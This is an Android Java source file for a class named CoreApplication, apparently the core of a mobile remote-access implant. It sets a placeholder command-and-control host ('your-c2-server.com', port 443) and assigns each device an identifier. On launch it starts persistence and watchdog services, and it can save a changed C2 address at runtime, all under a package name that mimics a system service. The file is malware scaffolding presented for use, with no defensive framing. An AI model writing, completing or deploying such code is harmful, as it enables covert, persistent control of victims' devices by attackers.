package com.system.service;

import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;

public class CoreApplication extends Application {

    private static CoreApplication instance;
    private SharedPreferences prefs;
    private String deviceId;
    private String c2Host = "your-c2-server.com";
    private int c2Port = 443;
    private boolean useSSL = true;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        prefs = getSharedPreferences("sys_cfg", MODE_PRIVATE);
        initDeviceId();
        startCoreServices();
    }

    private void initDeviceId() {
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = "dev_" + System.currentTimeMillis() + "_" + 
                       (int)(Math.random() * 100000);
            prefs.edit().putString("device_id", deviceId).apply();
        }
    }

    private void startCoreServices() {
        PersistenceService.start(this);
        WatchdogService.start(this);
    }

    public static CoreApplication getInstance() {
        return instance;
    }

    public String getDeviceId() { return deviceId; }
    public String getC2Host() { return c2Host; }
    public int getC2Port() { return c2Port; }
    public boolean useSSL() { return useSSL; }
    public SharedPreferences getPrefs() { return prefs; }

    public void setC2Config(String host, int port, boolean ssl) {
        this.c2Host = host;
        this.c2Port = port;
        this.useSSL = ssl;
        prefs.edit()
            .putString("c2_host", host)
            .putInt("c2_port", port)
            .putBoolean("c2_ssl", ssl)
            .apply();
    }
}